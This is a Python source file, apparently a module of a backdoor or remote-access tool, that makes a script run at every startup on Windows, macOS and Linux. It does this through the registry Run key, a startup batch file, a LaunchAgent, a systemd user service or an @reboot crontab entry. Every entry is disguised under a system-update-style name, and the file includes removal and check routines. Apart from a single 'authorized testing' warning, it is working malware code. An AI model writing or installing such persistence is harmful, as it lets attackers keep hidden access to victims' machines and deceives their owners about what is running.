################################################
# Persistence Feature Module                    #
# Establishes persistence on target system     #
################################################

import os
import platform
import subprocess
import sys


class Persistence:
    """
    Establishes persistence mechanisms to maintain access.
    Different techniques for Windows, Linux, and macOS.
    """
    
    def __init__(self):
        self.system = platform.system()
        self.script_path = os.path.abspath(sys.argv[0])
    
    def add_to_startup(self):
        """
        Add backdoor to system startup.
        WARNING: Modifies system - use only in authorized testing!
        """
        try:
            if self.system == 'Windows':
                return self._windows_startup()
            elif self.system == 'Darwin':
                return self._macos_startup()
            elif self.system == 'Linux':
                return self._linux_startup()
        except Exception as e:
            return f"Error adding to startup: {str(e)}"
    
    def _windows_startup(self):
        """Add to Windows startup"""
        try:
            # Add to registry (requires admin)
            reg_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
            app_name = 'WindowsUpdate'
            
            cmd = f'reg add HKCU\\{reg_key} /v {app_name} /t REG_SZ /d "{self.script_path}" /f'
            result = subprocess.call(cmd, shell=True)
            
            if result == 0:
                return "Successfully added to Windows startup (Registry)"
            else:
                # Try startup folder method
                startup_folder = os.path.join(
                    os.getenv('APPDATA'),
                    'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                )
                
                # Create a batch file to run the script
                batch_file = os.path.join(startup_folder, 'system_update.bat')
                with open(batch_file, 'w') as f:
                    f.write(f'@echo off\npython "{self.script_path}"')
                
                return f"Added to Windows startup folder: {batch_file}"
        
        except Exception as e:
            return f"Windows persistence error: {str(e)}"
    
    def _macos_startup(self):
        """Add to macOS launch agents"""
        try:
            launch_agents_dir = os.path.expanduser('~/Library/LaunchAgents')
            os.makedirs(launch_agents_dir, exist_ok=True)
            
            plist_file = os.path.join(launch_agents_dir, 'com.system.update.plist')
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{self.script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            
            # Load the launch agent
            subprocess.call(f'launchctl load {plist_file}', shell=True)
            
            return f"Added to macOS LaunchAgents: {plist_file}"
        
        except Exception as e:
            return f"macOS persistence error: {str(e)}"
    
    def _linux_startup(self):
        """Add to Linux startup"""
        try:
            # Try systemd user service
            systemd_dir = os.path.expanduser('~/.config/systemd/user')
            os.makedirs(systemd_dir, exist_ok=True)
            
            service_file = os.path.join(systemd_dir, 'system-update.service')
            
            service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target'''
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable the service
            subprocess.call('systemctl --user daemon-reload', shell=True)
            subprocess.call('systemctl --user enable system-update.service', shell=True)
            subprocess.call('systemctl --user start system-update.service', shell=True)
            
            return f"Added to Linux systemd: {service_file}"
        
        except Exception as e:
            # Fallback to crontab
            try:
                cron_entry = f'@reboot python3 {self.script_path}\n'
                subprocess.call(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -', shell=True)
                return "Added to Linux crontab (@reboot)"
            except:
                return f"Linux persistence error: {str(e)}"
    
    def remove_persistence(self):
        """Remove persistence mechanisms"""
        try:
            if self.system == 'Windows':
                return self._remove_windows_persistence()
            elif self.system == 'Darwin':
                return self._remove_macos_persistence()
            elif self.system == 'Linux':
                return self._remove_linux_persistence()
        except Exception as e:
            return f"Error removing persistence: {str(e)}"
    
    def _remove_windows_persistence(self):
        """Remove Windows persistence"""
        results = []
        
        # Remove from registry
        try:
            cmd = 'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f'
            subprocess.call(cmd, shell=True)
            results.append("Removed from Windows registry")
        except:
            pass
        
        # Remove from startup folder
        try:
            startup_folder = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            batch_file = os.path.join(startup_folder, 'system_update.bat')
            if os.path.exists(batch_file):
                os.remove(batch_file)
                results.append("Removed from startup folder")
        except:
            pass
        
        return '\n'.join(results) if results else "No persistence found to remove"
    
    def _remove_macos_persistence(self):
        """Remove macOS persistence"""
        try:
            plist_file = os.path.expanduser('~/Library/LaunchAgents/com.system.update.plist')
            
            if os.path.exists(plist_file):
                subprocess.call(f'launchctl unload {plist_file}', shell=True)
                os.remove(plist_file)
                return "Removed from macOS LaunchAgents"
            else:
                return "No persistence found to remove"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def _remove_linux_persistence(self):
        """Remove Linux persistence"""
        results = []
        
        # Remove systemd service
        try:
            service_file = os.path.expanduser('~/.config/systemd/user/system-update.service')
            if os.path.exists(service_file):
                subprocess.call('systemctl --user stop system-update.service', shell=True)
                subprocess.call('systemctl --user disable system-update.service', shell=True)
                os.remove(service_file)
                subprocess.call('systemctl --user daemon-reload', shell=True)
                results.append("Removed from systemd")
        except:
            pass
        
        # Remove from crontab
        try:
            subprocess.call(
                f"crontab -l 2>/dev/null | grep -v '{self.script_path}' | crontab -",
                shell=True
            )
            results.append("Removed from crontab")
        except:
            pass
        
        return '\n'.join(results) if results else "No persistence found to remove"
    
    def check_persistence(self):
        """Check if persistence is installed"""
        try:
            if self.system == 'Windows':
                cmd = 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate'
                result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return "Persistence installed" if result == 0 else "Persistence not installed"
            
            elif self.system == 'Darwin':
                plist_file = os.path.expanduser('~/Library/LaunchAgents/com.system.update.plist')
                return "Persistence installed" if os.path.exists(plist_file) else "Persistence not installed"
            
            elif self.system == 'Linux':
                service_file = os.path.expanduser('~/.config/systemd/user/system-update.service')
                if os.path.exists(service_file):
                    return "Persistence installed (systemd)"
                
                # Check crontab
                result = subprocess.call(
                    f"crontab -l 2>/dev/null | grep -q '{self.script_path}'",
                    shell=True
                )
                return "Persistence installed (crontab)" if result == 0 else "Persistence not installed"
        
        except Exception as e:
            return f"Error checking persistence: {str(e)}"
